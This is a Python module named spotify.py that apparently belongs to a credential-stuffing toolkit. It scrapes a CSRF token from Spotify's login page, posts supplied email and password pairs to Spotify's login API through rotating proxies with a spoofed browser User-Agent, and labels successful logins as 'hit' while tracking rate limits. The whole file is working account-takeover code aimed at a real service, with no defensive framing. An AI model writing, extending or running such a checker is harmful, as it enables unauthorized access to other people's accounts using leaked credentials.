"""
spotify.py — Spotify credential checker module.
"""

import requests
from scripts import get_proxy_dict


def check(email: str, password: str, proxies: list[str] = None) -> dict:
    """
    Check Spotify credentials via web auth flow.
    Returns {status: 'hit'|'fail'|'error'|'ratelimit', detail: str}
    *Spotify uses CSRF tokens on their login page — we need to
     grab one before POSTing credentials.*
    """
    session = requests.Session()
    proxy = get_proxy_dict(proxies) if proxies else None

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }

    try:
        # Step 1: Get CSRF token from login page
        login_page = session.get(
            "https://accounts.spotify.com/en/login",
            headers=headers, proxies=proxy, timeout=10
        )

        if login_page.status_code != 200:
            return {"status": "error", "detail": f"Login page returned {login_page.status_code}"}

        # Extract CSRF from cookies
        csrf_token = session.cookies.get("csrf_token", "")
        if not csrf_token:
            # Try extracting from page source
            import re
            match = re.search(r'csrf_token["\s:=]+([a-zA-Z0-9_-]+)', login_page.text)
            if match:
                csrf_token = match.group(1)

        # Step 2: Submit credentials
        auth_headers = {
            **headers,
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://accounts.spotify.com/en/login",
            "Origin": "https://accounts.spotify.com",
        }

        auth_data = {
            "username": email,
            "password": password,
            "csrf_token": csrf_token,
            "remember": "true",
        }

        resp = session.post(
            "https://accounts.spotify.com/api/login",
            headers=auth_headers, data=auth_data,
            proxies=proxy, timeout=10, allow_redirects=False
        )

        if resp.status_code == 200:
            body = resp.json() if resp.headers.get("content-type", "").startswith("application/json") else {}
            if body.get("displayName") or body.get("ok"):
                display = body.get("displayName", "Unknown")
                return {"status": "hit", "detail": f"Display: {display}"}
            elif body.get("error") == "errorInvalidCredentials":
                return {"status": "fail", "detail": "Invalid credentials"}
            else:
                return {"status": "fail", "detail": "Auth rejected"}

        elif resp.status_code == 429:
            return {"status": "ratelimit", "detail": "Rate limited"}

        elif resp.status_code in (302, 303):
            location = resp.headers.get("Location", "")
            if "login" not in location:
                return {"status": "hit", "detail": "Redirect to dashboard"}
            return {"status": "fail", "detail": "Redirect to login"}

        else:
            return {"status": "error", "detail": f"HTTP {resp.status_code}"}

    except requests.exceptions.Timeout:
        return {"status": "error", "detail": "Timeout"}
    except requests.exceptions.ProxyError:
        return {"status": "error", "detail": "Proxy error"}
    except Exception as exc:
        return {"status": "error", "detail": str(exc)[:60]}
